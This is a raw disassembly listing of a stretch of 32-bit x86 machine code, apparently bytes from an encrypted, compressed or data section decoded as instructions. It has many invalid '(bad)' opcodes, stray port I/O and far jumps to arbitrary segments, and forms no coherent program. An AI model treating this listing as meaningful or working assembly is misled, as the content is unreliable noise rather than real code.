  40e40d:	push   ebx
  40e40e:	int    0xc1
  40e410:	sub    eax,0x88b26919
  40e415:	sub    al,0xec
  40e417:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e418:	mov    ds:0x63bc9631,eax
  40e41d:	stos   BYTE PTR es:[edi],al
  40e41e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e41f:	or     eax,0xe706465e
  40e424:	push   edx
  40e425:	dec    ecx
  40e426:	test   BYTE PTR [esi-0x53],ch
  40e429:	sbb    BYTE PTR [edx],dh
  40e42b:	mov    esi,0x8467713f
  40e430:	fimul  WORD PTR [edx+0x2842eafc]
  40e436:	(bad)  
  40e437:	cmp    al,0xa5
  40e439:	ror    BYTE PTR ds:0xa3dc799,1
  40e43f:	push   0xffffffc8
  40e441:	sti    
  40e442:	(bad)  
  40e443:	aaa    
  40e444:	pop    esp
  40e445:	add    ebx,edx
  40e447:	sub    DWORD PTR [ebx-0x59],ecx
  40e44a:	icebp  
  40e44b:	cwde   
  40e44c:	arpl   WORD PTR [eax],bx
  40e44e:	(bad)  
  40e44f:	fwait
  40e450:	inc    edx
  40e451:	and    BYTE PTR [esi+ebx*2],ah
  40e454:	and    DWORD PTR [ebx],0xffffff8e
  40e457:	and    ecx,DWORD PTR [eax*2+0x66e71a2e]
  40e45e:	dec    ecx
  40e45f:	mov    esi,0xe9ed0296
  40e464:	aaa    
  40e465:	out    dx,eax
  40e466:	ss ins DWORD PTR es:[edi],dx
  40e468:	es icebp 
  40e46a:	push   ds
  40e46b:	test   eax,0x9006dc12
  40e470:	imul   esp,DWORD PTR [edi+0x18],0x72e5d14
  40e477:	jno    0x40e429
  40e479:	push   cs
  40e47a:	rcr    al,cl
  40e47c:	cld    
  40e47d:	repz aaa 
  40e47f:	stc    
  40e480:	inc    ecx
  40e481:	mov    cl,bl
  40e483:	mov    ecx,0x5e1a0f97
  40e488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e489:	jns    0x40e414
  40e48b:	test   eax,0x2f8adefe
  40e490:	cmp    BYTE PTR [ebx],al
  40e492:	out    0xaf,eax
  40e494:	cmp    dl,ch
  40e496:	or     edx,ecx
  40e498:	(bad)  
  40e499:	out    0x5d,eax
  40e49b:	mov    ebx,0xe41185e9
  40e4a0:	adc    BYTE PTR [edi+ebx*4],ch
  40e4a3:	std    
  40e4a4:	mov    dh,0x43
  40e4a6:	aam    0x4e
  40e4a8:	scas   al,BYTE PTR es:[edi]
  40e4a9:	lahf   
  40e4aa:	xlat   BYTE PTR ds:[ebx]
  40e4ab:	cmp    eax,0x75264079
  40e4b0:	das    
  40e4b1:	call   0x54dd1c09
  40e4b6:	xchg   ebp,eax
  40e4b7:	jno    0x40e50e
  40e4b9:	mov    al,ds:0x973f0fc0
  40e4be:	and    DWORD PTR [esi+0x113cba70],ebx
  40e4c4:	icebp  
  40e4c5:	out    dx,eax
  40e4c6:	outs   dx,BYTE PTR ds:[esi]
  40e4c7:	(bad)  
  40e4c8:	fmul   st(0),st
  40e4ca:	shl    BYTE PTR [edi+0x7],1
  40e4cd:	push   ebp
  40e4ce:	dec    ebx
  40e4cf:	inc    esi
  40e4d0:	push   ss
  40e4d1:	dec    ebx
  40e4d2:	xor    eax,0x23a93d2d
  40e4d7:	clc    
  40e4d8:	in     eax,0x27
  40e4da:	in     al,dx
  40e4db:	les    esp,FWORD PTR [edi]
  40e4dd:	jle    0x40e477
  40e4df:	enter  0xb08e,0x6a
  40e4e3:	fst    DWORD PTR [ecx+0x1652454a]
  40e4e9:	out    0x9b,eax
  40e4eb:	sbb    edi,DWORD PTR [ebx-0x3a]
  40e4ee:	xchg   ebp,eax
  40e4ef:	call   0xd4f6:0x98a24de4
  40e4f6:	cdq    
  40e4f7:	xchg   esp,eax
  40e4f8:	adc    dh,dh
  40e4fa:	pop    ecx
  40e4fb:	dec    edi
  40e4fd:	mov    gs,WORD PTR [eax-0x2eaf3642]
  40e503:	pop    ds
  40e504:	aam    0xce
  40e506:	inc    edx
  40e507:	adc    dh,ah
  40e509:	pop    edx
  40e50a:	adc    DWORD PTR [edi+ecx*4+0x3a3e7b20],ecx
  40e511:	jne    0x40e4a2
  40e513:	stc    
  40e514:	into   
  40e515:	adc    dl,BYTE PTR [esi]
  40e517:	ror    esp,cl
  40e519:	ins    BYTE PTR es:[edi],dx
  40e51a:	mov    ah,0xf4
  40e51c:	xlat   BYTE PTR ds:[ebx]
  40e51d:	stos   DWORD PTR es:[edi],eax
  40e51e:	pop    ds
  40e51f:	sti    
  40e520:	xchg   edx,eax
  40e521:	jnp    0x40e52f
  40e523:	call   0x865cfcf8
  40e528:	jns    0x40e575
  40e52a:	jmp    0x9b8f:0xbee1d0a8
  40e531:	std    
  40e532:	outs   dx,BYTE PTR ds:[esi]
  40e533:	mov    dh,0x14
  40e535:	test   al,0x7b
  40e537:	in     eax,dx
  40e538:	or     ebp,DWORD PTR [eax-0x44]
  40e53b:	inc    BYTE PTR [esi]
  40e53d:	inc    ebx
  40e53e:	add    esi,DWORD PTR [ebx]
  40e540:	xor    al,0x58
  40e542:	inc    eax
  40e543:	es jp  0x40e5b7
  40e546:	xor    ch,BYTE PTR [ecx+edx*4+0x41e2986c]
  40e54d:	pop    edi
  40e54e:	imul   esp,DWORD PTR [ebp+0x7b],0xffffffe0
  40e552:	arpl   WORD PTR [eax],si
  40e554:	rcr    BYTE PTR [ebx],cl
  40e556:	dec    ebp
  40e557:	sub    al,0x74
  40e559:	push   eax
  40e55a:	and    al,0x43
  40e55c:	loop   0x40e541
  40e55e:	out    dx,eax
  40e55f:	test   BYTE PTR [edi+edi*2],ah
  40e562:	les    esi,FWORD PTR [ecx]
  40e564:	retf   0x95e2
  40e567:	ret    
  40e568:	cdq    
  40e569:	fnstsw WORD PTR [edx]
  40e56b:	sub    esi,eax
  40e56d:	mov    ah,0xb3
  40e56f:	ja     0x40e555
  40e571:	shl    BYTE PTR [ebp+0x3620c2ae],1
  40e577:	sub    ah,dh
  40e579:	sar    BYTE PTR [esi],1
  40e57b:	sbb    edx,ebx
  40e57d:	inc    edi
  40e57e:	call   0x1693:0x7df9c50d
  40e585:	ror    ebx,1
  40e587:	inc    esi
  40e588:	into   
  40e589:	(bad)  
  40e58b:	xchg   ecx,eax
  40e58c:	jmp    0xb2d8:0xd1dd0392
  40e593:	jl     0x40e5ba
  40e595:	or     al,0x91
  40e597:	aad    0x3e
  40e599:	push   esi
  40e59a:	jo     0x40e53f
  40e59c:	push   ebp
  40e59d:	xchg   ebp,eax
  40e59e:	out    0xce,eax
  40e5a0:	pop    eax
  40e5a1:	sub    eax,0x7b703825
  40e5a6:	or     ebx,DWORD PTR [edi-0x12]
  40e5a9:	cdq    
  40e5aa:	mov    edi,0xc0f73ef9
  40e5af:	inc    DWORD PTR [esi-0x61bfc40e]
  40e5b5:	jl     0x40e5e1
  40e5b7:	out    0xfc,al
  40e5b9:	(bad)  
  40e5ba:	cdq    
  40e5bb:	xlat   BYTE PTR ds:[ebx]
  40e5bc:	call   DWORD PTR [eax]
  40e5be:	add    eax,0x92b01058
  40e5c3:	(bad)  
  40e5c4:	xchg   esi,eax
  40e5c5:	sub    al,0xba
  40e5c7:	add    eax,0x2635b792
  40e5cc:	aam    0x55
  40e5ce:	pop    ss
  40e5cf:	test   DWORD PTR [ecx-0x37c4536e],edi
  40e5d5:	repz aaa 
  40e5d7:	and    BYTE PTR [edx],0x84
  40e5da:	fninit 
  40e5dc:	mov    ds:0xf1683c21,al
  40e5e1:	push   edi
  40e5e2:	sub    esi,DWORD PTR [ebx]
  40e5e4:	into   
  40e5e5:	hlt    
  40e5e6:	inc    eax
  40e5e7:	sub    DWORD PTR [edx],0x377e45c
  40e5ed:	data16 in al,0x0
  40e5f0:	adc    al,0x2f
  40e5f2:	pop    edx
  40e5f3:	test   eax,0xc33bddfa
  40e5f8:	mov    ch,0xeb
  40e5fa:	mov    ebp,0x230f1b5f
  40e5ff:	jmp    0x2a966e05
  40e604:	sbb    ecx,DWORD PTR [ebp+0x5d057d19]
  40e60a:	std    
  40e60b:	out    dx,al
  40e60c:	push   ss
  40e60d:	outs   dx,DWORD PTR ds:[esi]
  40e60e:	lahf   
  40e60f:	js     0x40e61e
  40e611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e612:	mov    dh,0x16
  40e614:	pop    edi
  40e615:	sbb    DWORD PTR [eax-0x65],ebp
  40e618:	pop    esi
  40e619:	call   0x3f52:0x2eb570f1
  40e620:	pop    edx
  40e621:	xor    eax,0x965a9a97
  40e626:	jae    0x40e5ee
  40e628:	jle    0x40e5c1
  40e62a:	add    eax,0x50618afd
  40e62f:	sub    al,0xd8
  40e631:	cld    
  40e632:	jae    0x40e63b
  40e634:	ret    
  40e635:	mov    eax,0x7517a04d
  40e63a:	test   eax,0x3bf6cb34
  40e63f:	test   BYTE PTR [ebx+0x3084bee0],cl
  40e645:	and    ax,0xd363
  40e649:	mov    esi,0x6518f603
  40e64e:	pushf  
  40e64f:	dec    edi
  40e650:	push   esp
  40e651:	mov    al,ds:0xe9a58c02
  40e656:	arpl   WORD PTR [esi-0x1f],si
  40e659:	xor    DWORD PTR [ebp-0x73],ecx
  40e65c:	dec    eax
  40e65d:	mov    edx,0xdce2601d
  40e662:	lods   eax,DWORD PTR ds:[esi]
  40e663:	cmp    BYTE PTR [eax+0x5d962f87],ah
  40e669:	(bad)  
  40e66a:	es push 0xffffffe5
  40e66d:	xor    ebp,DWORD PTR [eax+ebp*8-0x44fa57]
  40e674:	xchg   esp,eax
  40e675:	adc    eax,0xd5e77526
  40e67a:	sub    eax,0xc9e32fbc
  40e67f:	xchg   edx,eax
  40e680:	cs jns 0x40e69a
  40e683:	mov    ebp,0x4cc569af
  40e688:	retf   
  40e689:	mov    ecx,DWORD PTR [ecx+0x1b4aad1d]
  40e68f:	cli    
  40e690:	sub    al,0x59
  40e692:	imul   esp,DWORD PTR cs:[ecx],0xfffffff8
  40e696:	push   0x30318c51
  40e69b:	(bad)  
  40e69c:	(bad)  
  40e69d:	in     eax,0x5e
  40e69f:	mov    eax,ds:0xae24851
  40e6a4:	mov    ebx,edx
  40e6a6:	lods   al,BYTE PTR ds:[esi]
  40e6a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6a8:	mov    ebx,esp
  40e6aa:	adc    al,0x6
  40e6ac:	cs jge 0x40e668
  40e6af:	push   ss
  40e6b0:	div    BYTE PTR [ebx-0x67e6b207]
  40e6b6:	pusha  
  40e6b7:	mov    ebp,0x581bf4c
  40e6bc:	add    cl,BYTE PTR [esi-0x3cd6221d]
  40e6c2:	push   ds
  40e6c3:	sbb    ebx,DWORD PTR [edx]
  40e6c5:	dec    esp
  40e6c6:	mov    DWORD PTR [ebx-0x34],esp
  40e6c9:	cwde   
  40e6ca:	cmp    BYTE PTR [edx+0x19],0x6f
  40e6ce:	mov    dl,0x2d
  40e6d0:	in     eax,dx
  40e6d1:	fistp  WORD PTR [ebp-0x30f507e4]
  40e6d7:	test   al,0x2f
  40e6d9:	cmc    
  40e6da:	hlt    
  40e6db:	sbb    al,0xb1
  40e6dd:	pop    ebp
  40e6de:	test   al,0xde
  40e6e0:	int3   
  40e6e1:	cld    
  40e6e2:	ds aaa 
  40e6e4:	xchg   edx,eax
  40e6e5:	jg     0x40e667
  40e6e7:	xor    eax,DWORD PTR [edi+0x6b]
  40e6ea:	ds dec edi
  40e6ec:	cmp    eax,0xcfd63b17
  40e6f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6f2:	push   ecx
  40e6f3:	pusha  
  40e6f4:	mov    cs,ecx
  40e6f6:	adc    esi,DWORD PTR ds:0x114469eb
  40e6fc:	fild   DWORD PTR [ebx-0x66]
  40e6ff:	adc    ebp,ecx
  40e701:	sbb    BYTE PTR [ebp-0x12],ah
  40e704:	mov    dh,0x78
  40e706:	dec    esp
  40e707:	pop    ds
  40e708:	dec    ebx
  40e709:	jecxz  0x40e745
  40e70b:	test   BYTE PTR [edx],0xff
  40e70e:	iret   
  40e70f:	loop   0x40e71f
  40e711:	sti    
  40e712:	jo     0x40e696
  40e714:	cmp    eax,0xc7721e30
  40e719:	cmp    al,0x6a
  40e71b:	enter  0xa5bd,0x97
  40e71f:	scas   eax,DWORD PTR es:[edi]
  40e720:	sub    ecx,esp
  40e722:	stc    
  40e723:	aas    
  40e724:	adc    eax,0xd7637139
  40e729:	mov    ebp,0xd89c07fa
  40e72e:	jmp    0xae72:0x421d510b
  40e735:	ja     0x40e6fe
  40e737:	jle    0x40e721
  40e739:	push   edx
  40e73a:	stos   DWORD PTR es:[edi],eax
  40e73b:	mov    bh,0xaa
  40e73d:	popf   
  40e73e:	daa    
  40e73f:	dec    edi
  40e740:	mov    ah,0x35
  40e742:	cmp    al,0x30
  40e744:	enter  0xb79c,0x10
  40e748:	adc    BYTE PTR [edi-0xc],dl
  40e74b:	(bad)  [ebp+0x17]
  40e74e:	mov    eax,0x470955
  40e753:	enter  0xc41b,0x1a
  40e757:	cwde   
  40e758:	adc    BYTE PTR [ecx+0x7d24d759],bh
  40e75e:	rol    DWORD PTR [esi+0x4a1fd25a],cl
  40e764:	adc    BYTE PTR [ecx+ebx*1-0x7b],bh
  40e768:	(bad)  
  40e769:	and    esp,DWORD PTR [eax+0x60]
  40e76c:	js     0x40e7ac
  40e76e:	adc    al,dh
  40e770:	cmp    al,0xae
  40e772:	mov    bl,BYTE PTR ds:[eax+0x18]
  40e776:	imul   ecx,DWORD PTR [ecx+ebp*2],0x5321fb77
  40e77d:	out    0xff,eax
  40e77f:	mov    cl,0xac
  40e781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e782:	call   FWORD PTR [esi]
  40e784:	sahf   
  40e785:	loop   0x40e763
  40e787:	sbb    BYTE PTR [edi-0x3d],0xe7
  40e78b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e78c:	inc    edi
  40e78d:	jmp    0x40e738
  40e78f:	sar    eax,1
  40e791:	mov    gs,WORD PTR [edi]
  40e793:	add    dl,BYTE PTR [ecx+eiz*4]
  40e796:	mov    eax,ds:0x44e6124c
  40e79b:	clc    
  40e79c:	jbe    0x40e813
  40e79e:	xor    BYTE PTR [ebp-0x6d],bl
  40e7a1:	sbb    dh,BYTE PTR [edi]
  40e7a3:	inc    eax
  40e7a4:	das    
  40e7a5:	test   al,0xc0
  40e7a7:	dec    ebp
  40e7a8:	mov    bh,0x81
  40e7aa:	push   edi
  40e7ab:	push   0xffffff89
  40e7ad:	inc    edi
  40e7ae:	ret    0x4157
  40e7b1:	fnstsw WORD PTR [ebx]
  40e7b3:	cmp    dl,BYTE PTR [ecx-0x54]
  40e7b6:	cdq    
  40e7b7:	push   edi
  40e7b8:	mov    al,ds:0x671ac4b2
  40e7bd:	fstp   QWORD PTR [esi+0x21df0aab]
  40e7c3:	or     eax,0x20412a63
  40e7c8:	pop    ss
  40e7c9:	retf   0x3bc8
  40e7cc:	loopne 0x40e799
  40e7ce:	adc    esp,DWORD PTR [ecx]
  40e7d0:	jbe    0x40e76f
  40e7d2:	push   ds
  40e7d3:	les    ebx,FWORD PTR [edi+0x26f8b16b]
  40e7d9:	mov    dh,0x7
  40e7db:	mov    es,esp
  40e7dd:	mov    ch,0x25
  40e7df:	sbb    DWORD PTR [edi-0x71417795],eax
  40e7e5:	fmul   st,st(6)
  40e7e7:	test   DWORD PTR [ecx-0x1a],0x4d6d444
  40e7ee:	scas   eax,DWORD PTR es:[edi]
  40e7ef:	out    dx,eax
  40e7f0:	stc    
  40e7f1:	jge    0x40e791
  40e7f3:	ja     0x40e7db
  40e7f5:	cmp    eax,0x997fc612
  40e7fa:	lea    ebx,[eax+0x2a]
  40e7fd:	sbb    al,0x78
  40e7ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e800:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e801:	lahf   
  40e802:	and    bl,BYTE PTR [esp+edi*8-0x70]
  40e806:	and    ch,bh
  40e808:	sub    eax,esp
  40e80a:	test   al,0x4c
  40e80c:	jae    0x40e831
  40e80e:	aas    
  40e80f:	xor    edi,DWORD PTR [edx]
  40e811:	popf   
  40e812:	sub    BYTE PTR [ebx+0x7a],dl
  40e815:	out    dx,eax
  40e816:	jb     0x40e81f
  40e818:	nop
  40e819:	sub    edx,DWORD PTR [edx-0x591d6eb5]
  40e81f:	jo     0x40e85c
  40e821:	in     eax,0xe4
  40e823:	xor    eax,0xaabefb31
  40e828:	fsub   QWORD PTR [esi]
  40e82a:	nop
  40e82b:	and    ah,BYTE PTR [ecx]
  40e82d:	mov    BYTE PTR [edx-0x54f326cb],ah
  40e833:	loop   0x40e7e0
  40e835:	inc    edx
  40e836:	jl     0x40e7c3
  40e838:	test   al,0xe5
  40e83a:	adc    esp,eax
  40e83c:	adc    DWORD PTR [ebx+0x56c1ab7f],ecx
  40e842:	dec    edi
  40e843:	pop    esi
  40e844:	retf   
  40e845:	push   cs
  40e846:	pop    eax
  40e847:	into   
  40e848:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e849:	add    eax,0xb32d0711
  40e84e:	mov    dh,BYTE PTR [ebx+eax*2-0x21]
  40e852:	add    ebx,DWORD PTR [ebx]
  40e854:	dec    esi
  40e855:	xor    DWORD PTR [eax+edi*4+0x1d7b2328],esp
  40e85c:	pop    ebx
  40e85d:	jecxz  0x40e8be
  40e85f:	popa   
  40e860:	mov    bh,0xd2
  40e862:	fdivr  DWORD PTR [esi]
  40e864:	lods   eax,DWORD PTR ds:[esi]
  40e865:	in     al,0x70
  40e867:	jge    0x40e84b
  40e869:	mov    al,0x3
  40e86b:	sbb    dh,ah
  40e86d:	daa    
  40e86e:	outs   dx,DWORD PTR ss:[esi]
  40e870:	mov    ah,0x1c
  40e872:	dec    DWORD PTR [edi+0x616d9558]
  40e878:	rol    DWORD PTR [esi*2-0x47e161be],cl
  40e87f:	out    dx,eax
  40e880:	inc    ebx
  40e881:	mov    al,ds:0x57f56b63
  40e886:	jmp    0xb920:0xa18d14e4
  40e88d:	jmp    0xa071e771
  40e892:	cmp    DWORD PTR [eax*8-0x68c732a9],ebp
  40e899:	push   edx
  40e89a:	retf   0xf38e
  40e89d:	add    eax,0x3e1a9460
  40e8a2:	xchg   esp,eax
  40e8a3:	inc    esi
  40e8a4:	add    DWORD PTR [edi],ebp
  40e8a6:	sub    eax,esp
  40e8a8:	mov    esp,0xa70682b0
  40e8ad:	dec    cx
  40e8af:	shr    BYTE PTR [edx],cl
  40e8b1:	sub    eax,0xb6b8f459
  40e8b6:	fbld   TBYTE PTR [ebx]
  40e8b8:	test   al,0x80
  40e8ba:	ds pop edx
  40e8bc:	mov    dl,0xa4
  40e8be:	mov    dl,0x67
  40e8c0:	fstp   QWORD PTR [edi+0x51]
  40e8c3:	push   ecx
  40e8c4:	pop    ebx
  40e8c5:	dec    ecx
  40e8c6:	mov    ebp,0xad7485db
  40e8cb:	repz and esp,esp
  40e8ce:	mov    ds:0xcfac4ae,eax
  40e8d3:	test   ebp,eax
  40e8d5:	(bad)  
  40e8d6:	test   BYTE PTR [esi+0x73f20729],0x8f
  40e8dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8de:	clc    
  40e8df:	cmp    BYTE PTR [eax],ah
  40e8e1:	xor    DWORD PTR [ebx-0x28d67fb1],esi
  40e8e7:	call   0x7ef0:0x9b29cd19
  40e8ee:	push   0xffffffa4
  40e8f0:	mov    ebp,DWORD PTR [edi+0x6b]
  40e8f3:	xchg   ebp,eax
  40e8f4:	inc    esi
  40e8f5:	fist   DWORD PTR [edi+0x77]
  40e8f8:	mov    dh,0x5f
  40e8fa:	test   BYTE PTR [ebp-0x35d263ac],al
  40e900:	mov    ecx,0x64063729
  40e905:	pop    esi
  40e906:	pop    ebp
  40e907:	in     al,dx
  40e908:	inc    ebx
  40e909:	inc    edi
  40e90a:	mov    al,0x10
  40e90c:	add    WORD PTR [ebx],dx
  40e90f:	and    ah,BYTE PTR [ebp+0x64]
  40e912:	push   edi
  40e913:	sub    BYTE PTR [esi+0x60],cl
  40e916:	add    BYTE PTR [edx+0x0],bh
  40e919:	es cmp dh,BYTE PTR es:[ebx]
  40e91d:	retf   
  40e91e:	fdiv   QWORD PTR [ebx]
  40e920:	sbb    bl,0x29
  40e923:	in     eax,dx
  40e924:	out    0x81,eax
  40e926:	jge    0x40e8f7
  40e928:	mov    bh,0xad
  40e92a:	sbb    BYTE PTR [esi],dh
  40e92c:	das    
  40e92d:	(bad)  
  40e92e:	cli    
  40e92f:	adc    eax,0x9d711725
  40e934:	stos   DWORD PTR es:[edi],eax
  40e935:	jmp    0x846a:0xd365d5c3
  40e93c:	and    al,bh
  40e93e:	les    esi,FWORD PTR [esi]
  40e940:	call   0x5d2a28a0
  40e945:	pop    es
  40e946:	(bad)  
  40e947:	sbb    al,0xc
  40e949:	scas   al,BYTE PTR es:[edi]
  40e94a:	inc    ebx
  40e94b:	outs   dx,DWORD PTR ds:[esi]
  40e94c:	pushf  
  40e94d:	daa    
  40e94e:	pusha  
  40e94f:	pop    esi
  40e950:	repnz mov al,0x70
  40e953:	iret   
  40e954:	sub    dh,BYTE PTR [ecx-0x30]
  40e957:	ja     0x40e913
  40e959:	jno    0x40e8fa
  40e95b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e95c:	gs sub eax,0xcfec7fe5
  40e962:	ret    0xb7d5
  40e965:	dec    edi
  40e966:	ror    ch,0xba
  40e969:	imul   esi,DWORD PTR [ebp+0x1b],0x2beff2c9
  40e970:	push   cs
  40e971:	shl    DWORD PTR [ecx+0x70e9358],0x9a
  40e978:	cdq    
  40e979:	inc    esp
  40e97a:	xchg   DWORD PTR [ebx-0x26],eax
  40e97d:	jg     0x40e964
  40e97f:	test   DWORD PTR [eax-0x3f],ebp
  40e982:	cmp    al,0x94
  40e984:	mov    ebx,0x7b14f743
  40e989:	shl    edi,cl
  40e98b:	and    BYTE PTR [esi],0x3a
  40e98e:	int3   
  40e98f:	xchg   DWORD PTR [ebp-0x23],esi
  40e992:	or     eax,0xbebea5af
  40e997:	mov    ecx,0xd6fbd3cd
  40e99c:	fs es inc ebx
  40e99f:	xchg   edi,eax
  40e9a0:	(bad)  
  40e9a1:	es or  al,0xdd
  40e9a4:	bound  edx,QWORD PTR ds:0xf0051a4f
  40e9aa:	sbb    al,0x1
  40e9ac:	jns    0x40ea28
  40e9ae:	pop    ds
  40e9af:	push   0xffffffe0
  40e9b1:	in     eax,0x79
  40e9b3:	mov    al,ds:0x90c20932
  40e9b8:	mov    dl,0x6e
  40e9ba:	jns    0x40e995
  40e9bc:	arpl   WORD PTR [ebx-0x1a],bp
  40e9bf:	sahf   
  40e9c0:	mov    dh,0xfc
  40e9c2:	hlt    
  40e9c3:	mov    cl,0x97
  40e9c5:	mov    bl,0x58
  40e9c7:	inc    ebp
  40e9c8:	xor    bh,bl
  40e9ca:	mov    bh,0xaa
  40e9cd:	das    
  40e9ce:	sbb    eax,0xeccb4760
  40e9d3:	in     al,dx
  40e9d4:	cwde   
  40e9d5:	push   edi
  40e9d6:	outs   dx,BYTE PTR ds:[esi]
  40e9d7:	jecxz  0x40e9b4
  40e9d9:	cdq    
  40e9da:	in     al,0xbf
  40e9dc:	xor    dh,cl
  40e9de:	(bad)  
  40e9df:	push   ebp
  40e9e0:	lea    ecx,[ebx-0x164ad69d]
  40e9e6:	add    dl,dl
  40e9e8:	dec    ebx
  40e9e9:	sbb    al,0x3f
  40e9eb:	mov    ds:0x43461bc7,eax
  40e9f0:	call   0xcabce0ee
  40e9f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9f6:	repz cmp cl,dl
  40e9f9:	ja     0x40ea4a
  40e9fb:	loopne 0x40e9bb
  40e9fd:	dec    ebx
  40e9fe:	sbb    eax,0x205fe494
  40ea03:	stos   BYTE PTR es:[edi],al
  40ea04:	mov    dl,0xf
  40ea06:	mov    ebp,0x7a558017
  40ea0b:	sub    eax,0x18c813a7
  40ea10:	xor    al,0x81
  40ea12:	xor    BYTE PTR [ebp+0x0],cl
  40ea15:	xor    DWORD PTR [ebp+esi*2-0x31],edi
  40ea19:	cmc    
  40ea1a:	scas   eax,DWORD PTR es:[edi]
  40ea1b:	add    esp,0x7f
  40ea1e:	idiv   BYTE PTR [esi+0x7f4767a9]
  40ea24:	call   0x457312a
  40ea29:	(bad)  
  40ea2a:	imul   eax,DWORD PTR [edx],0xfa1ddb04
  40ea30:	call   0x23a8:0xd2c00cbb
  40ea37:	inc    ebp
  40ea38:	cli    
  40ea39:	out    0xba,al
  40ea3b:	adc    DWORD PTR [edi+0x7e],ecx
  40ea3e:	popf   
  40ea3f:	hlt    
  40ea40:	fsub   QWORD PTR [edx]
  40ea42:	mov    dh,0x81
  40ea44:	test   DWORD PTR [edx+0x69],edi
  40ea47:	mov    dh,0x23
  40ea49:	jne    0x40ea58
  40ea4b:	push   eax
  40ea4c:	jmp    0x40e9cf
  40ea4e:	int    0x7a
  40ea50:	xor    bl,dl
  40ea52:	pusha  
  40ea53:	cmp    cl,cl
  40ea55:	int3   
  40ea56:	aam    0xce
  40ea58:	dec    edi
  40ea59:	add    eax,0xd7cf164b
  40ea5e:	pushf  
  40ea5f:	dec    ecx
  40ea60:	push   ds
  40ea61:	das    
  40ea62:	adc    BYTE PTR [ebx-0x45],dl
  40ea65:	stos   BYTE PTR es:[edi],al
  40ea66:	ror    BYTE PTR [ebp-0x5d5de5da],cl
  40ea6c:	xchg   esi,eax
  40ea6d:	jbe    0x40ea60
  40ea6f:	ins    DWORD PTR es:[edi],dx
  40ea70:	jmp    0xae3:0x8215c938
  40ea77:	pop    edx
  40ea78:	dec    ecx
  40ea79:	rcl    BYTE PTR [edx+edx*8],cl
  40ea7c:	sahf   
  40ea7d:	pop    ds
  40ea7e:	into   
  40ea7f:	or     eax,ebx
  40ea81:	pop    ebp
  40ea82:	push   es
  40ea83:	mov    eax,ds:0x99e00a09
  40ea88:	(bad)  
  40ea89:	mov    al,ds:0x4e12d2c0
  40ea8e:	fldcw  WORD PTR [ebx+0x1d0c9455]
  40ea94:	stos   BYTE PTR es:[edi],al
  40ea95:	mov    eax,ds:0x1849a12
  40ea9a:	ins    BYTE PTR es:[edi],dx
  40ea9b:	(bad)  
  40ea9c:	imul   edx,edx,0x30
  40ea9f:	hlt    
  40eaa0:	cmc    
  40eaa1:	xchg   edx,ecx
  40eaa3:	xchg   ebx,eax
  40eaa4:	jmp    0x40eaf5
  40eaa6:	fldenv [ebp+0x5]
  40eaa9:	out    dx,eax
  40eaaa:	push   eax
  40eaab:	cmp    eax,0xd692e113
  40eab0:	xchg   eax,ebp
  40eab2:	ror    BYTE PTR [ecx-0x24],1
  40eab5:	jne    0x40eb1b
  40eab7:	and    bh,BYTE PTR [esi-0x1f2867ca]
  40eabd:	or     eax,0x54e9465d
  40eac2:	add    esp,esp
  40eac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eac5:	lahf   
  40eac6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eac7:	ja     0x40eafe
  40eac9:	add    bl,BYTE PTR [esi]
  40eacb:	jnp    0x40ea87
  40eacd:	push   eax
  40eace:	out    0x86,al
  40ead0:	adc    eax,0x5cd82f1f
  40ead5:	dec    esi
  40ead6:	into   
  40ead7:	call   0x4453:0xbe4e2c7c
  40eade:	dec    eax
  40eadf:	cmp    edi,DWORD PTR [esi+0x19]
  40eae2:	pushf  
  40eae3:	jg     0x40eaaa
  40eae5:	lahf   
  40eae6:	ja     0x40eb2c
  40eae8:	push   esp
  40eae9:	mov    bl,0xfe
  40eaeb:	test   DWORD PTR [ebp-0x39],0xf77fca85
  40eaf2:	jge    0x40ead3
  40eaf4:	xor    esi,eax
  40eaf6:	mov    bh,0xec
  40eaf8:	(bad)
  40eafc:	or     ah,BYTE PTR [eax+0x79b093c8]
  40eb02:	aam    0x8
  40eb04:	out    dx,eax
  40eb05:	pop    eax
  40eb06:	daa    
  40eb07:	hlt    
  40eb08:	mov    ah,0xd5
  40eb0a:	xchg   esi,eax
  40eb0b:	fisub  WORD PTR [esi]
  40eb0d:	jle    0x40eb66
  40eb0f:	push   ss
  40eb10:	out    dx,eax
  40eb11:	mov    ebp,0xf382d505
  40eb16:	arpl   WORD PTR [edx-0x736cb946],di
  40eb1c:	dec    esp
  40eb1d:	shr    edx,0x9b
  40eb20:	aaa    
  40eb21:	shl    BYTE PTR [edi],cl
  40eb23:	ror    DWORD PTR [edx+0x74],1
  40eb26:	jg     0x40eb98
  40eb28:	adc    BYTE PTR [esi-0x5b09964b],dl
  40eb2e:	cwde   
  40eb2f:	fsub   DWORD PTR ds:0x86ebbf8d
  40eb35:	mov    dh,0xb3
  40eb37:	adc    BYTE PTR [eax-0x2c],ah
  40eb3a:	scas   eax,DWORD PTR es:[edi]
  40eb3b:	dec    esp
  40eb3c:	lods   al,BYTE PTR ds:[esi]
  40eb3d:	and    DWORD PTR [edi],edi
  40eb3f:	imul   eax,DWORD PTR [edi+0xe],0xffffff9e
  40eb43:	push   ecx
  40eb44:	xor    BYTE PTR [eax+0x18f8a9dc],0xdc
  40eb4b:	in     al,0x18
  40eb4d:	jbe    0x40eba8
  40eb4f:	das    
  40eb50:	pop    ds
  40eb51:	fisubr WORD PTR [edi]
  40eb53:	into   
  40eb54:	jbe    0x40eb71
  40eb56:	sub    bl,BYTE PTR [ebp-0x2684d32f]
  40eb5c:	test   al,0x28
  40eb5e:	les    edx,FWORD PTR [edi+eax*1-0x50]
